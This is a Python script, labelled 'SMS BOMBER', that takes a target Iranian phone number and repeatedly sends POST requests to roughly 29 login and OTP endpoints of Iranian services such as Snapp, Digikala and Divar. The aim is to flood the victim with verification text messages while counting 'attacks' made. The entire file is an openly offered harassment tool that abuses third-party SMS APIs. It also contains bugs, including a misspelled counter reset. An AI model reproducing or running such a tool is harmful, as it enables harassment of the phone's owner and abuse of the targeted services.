# imports:
from os import system
from time import sleep
#---------------------------------
system('pip3 install requests')# |
system('pip3 install colorama')# |
#---------------------------------
try:
    from requests import post
    from colorama import Fore
except:
    system('cls')
    print('\n\n\n\n\nerror:\n       The program encountered a problem in installing plugins\n\n       Run the program again to fix the error')
#---------------------------------------------------------------------------------------------------------------------------------------------

# Variables:
check = 0
line = '-'

    # phone:
while True:

    if check == 0:
        system('cls')
        print(Fore.BLUE+'''
███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
███████╗██╔████╔██║███████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
╚════██║██║╚██╔╝██║╚════██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
███████║██║ ╚═╝ ██║███████║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝\n\n''',Fore.WHITE+line*82)
        phone = input('enter the target phone number(+98XXXXXXXXXX)')

        try:
            phone = int(phone)

        except:
            check = 1

    elif check == 1:
        system('cls')
        print(Fore.BLUE+'''
███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
███████╗██╔████╔██║███████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
╚════██║██║╚██╔╝██║╚════██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
███████║██║ ╚═╝ ██║███████║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝\n\n''',Fore.WHITE+line*82)
        print('The number you entered is incorrect\n')
        phone = input('enter the target phone number(+98XXXXXXXXXX)')
        try:
            phone = int(phone)

        except:
            check = 1
        
        if type(phone) == type(1):
            check = 0

    if check == 0:
        phone = str(phone)
        # listPhone = list(phone)

        if len(phone) == 12 and phone[0] == '9' and phone[1] == '8' and phone[2] == '9':
            phone = phone[2:]

            if len(phone) == 10:
                break

            else:
                check = 1

        elif len(phone) == 10 and phone[0] == '9':
            break

        else:
            check = 1
    
    # If the phone variable becomes an integer, 0 and + will be removed from this variable.
    #------------------------------------------------------------------------------------------------------------
    
linkReq = ['https://api.snapp.ir/api/v1/sms/link', 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', 'https://digitalsignup.snapp.ir/ds3/api/v3/otp?cellphone=0'+phone, 'https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=1a857c1b-f01b-476a-99c2-78888d41b022&locale=fa', 'https://api.tapsi.cab/api/v2.2/user', 'https://api.digikala.com/v1/user/authenticate/', 'https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request', 'https://ws.alibaba.ir/api/v3/account/mobile/otp', 'https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one', 'https://www.sheypoor.com/api/v10.0.0/auth/send', 'https://api.divar.ir/v5/auth/authenticate', 'https://next.zarinpal.com/api/oauth/initialize', 'https://account.bama.ir/api/otp/Generate/v2', 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode', 'https://app.itoll.ir/api/v1/auth/login', 'https://drdr.ir/api/registerEnrollment/verifyMobile', 'https://www.drsaina.com/RegisterLogin?ReturnUrl=/consultation', 'https://mobapi.banimode.com/api/v2/auth/request', 'https://my.limoome.com/auth/check-mobile', 'https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/', 'https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL', 'https://gw.taaghche.com/v4/site/auth/login', 'https://ketabchi.com/api/v1/auth/requestVerificationCode', 'https://api.komodaa.com/api/v2.6/loginRC/request', 'https://app.nobaarapp.ir/api/discount_code_send', 'https://lottery.rayanertebat.ir/api/User/Otp?t=1678017069877', 'https://app.mydigipay.com/digipay/api/users/send-sms', 'https://auth.honari.com/api/check-phone-number', 'https://napi.snapproom.com/users/self/verification-flow']
dataReq = [{"phone":"0"+phone}, {"cellphone":"+98"+phone}, {"cellphone":"0"+phone}, 'cellphone=0'+phone, {"credential":{"phoneNumber":"0"+phone,"role":"PASSENGER"},"otpOption":"SMS"}, {"backUrl":"/","username":"0"+phone,"otp_call":'false'}, {"UserName":"+98"+phone}, {"phoneNumber":phone}, {"code":"98","phone":phone,"smsStatus":"default"}, {"username":"0"+phone}, {"phone":phone}, {"username":"0"+phone}, {"cellNumber":"0"+phone,"appname":"popuplogin","smsfor":6}, {"Parameters":{"ApplicationType":"Web","ApplicationUniqueToken":'null',"ApplicationVersion":"1.0.0","MobileNumber":"0"+phone,"UniqueToken":'null'}}, {"mobile":"0"+phone}, {"phoneNumber":phone,"userType":"PATIENT"}, f'__RequestVerificationToken=CfDJ8LAHk8-NI5hBqr_jKzR9ilKaEeXHmaPKsYwFl3qHI5o17wXq5PhSrCFJEu-xv0iRJNDmL4UQ3cW3YyLbPhp_YML3PBu5YmnSs5-wWOCOBPQYERzTcA3nj3X9-y6RS4vrsM8hIb6WWqDxCrGiOQP29pE&noLayout=False&action=checkIfUserExistOrNot&lId=&codeGuid=00000000-0000-0000-0000-000000000000&PhoneNumber=0{phone}&confirmCode=&fullName=&Password=&Password2=', {"phone":"0"+phone}, {"mobileNumber":phone,"countryId":"1"}, {"phoneNumber":"0"+phone}, {"mobile":"0"+phone}, {"contact":"0"+phone,"forceOtp":'false'}, {"auth":{"phoneNumber":"0"+phone}}, {"phone_number":"0"+phone}, 'phone=0', {"mobileNo":"0"+phone}, {"cellNumber":"0"+phone,"device":{"deviceId":"d520c7a8-421b-4563-b955-f5abc56b97ec","deviceModel":"Windows/Firefox","deviceAPI":"WEB_BROWSER","osName":"WEB"}}, {"username":"0"+phone}, {"username":"0"+phone}]
counter = 0
attackCounter = 0
counterOfSentMessages = 0
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#Executive code:

while True:

    try:
        request = post(linkReq[counter],json=dataReq[counter])

    except:
        pass

    counter += 1
    attackCounter += 1

    if counter == len(linkReq)+1:
        conuter = 0

    if request.status_code ==  200:
        counterOfSentMessages += 1

    system('cls')
    print(Fore.GREEN + '''
███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
███████╗██╔████╔██║███████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
╚════██║██║╚██╔╝██║╚════██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
███████║██║ ╚═╝ ██║███████║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝\n\n''',Fore.WHITE+line*82)
    print(f'{line*28}\n|  Attacking "'+phone+'"  |\n'+line*28,'\n')
    print(f'{attackCounter} attack has been made.')
    print(f'{counterOfSentMessages} message was sent')
    print('Press "CTRL" and "C" keys at the same time to end the attack')

    if request.status_code == 200:

        try:
            sleep(2)

        except:
            # If the user presses the "CTRL" and "C" buttons at the same time, the action of line "124" will not be performed and the "except" of line "126" will be executed.
            system('cls')
            print(Fore.RED+'''
███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
███████╗██╔████╔██║███████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
╚════██║██║╚██╔╝██║╚════██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
███████║██║ ╚═╝ ██║███████║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝\n\n''',Fore.WHITE+'\n'+line*82)
            print(f'{attackCounter} attack has been made.')
            print(f'{counterOfSentMessages} message was sent')
            exit()
#-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#done.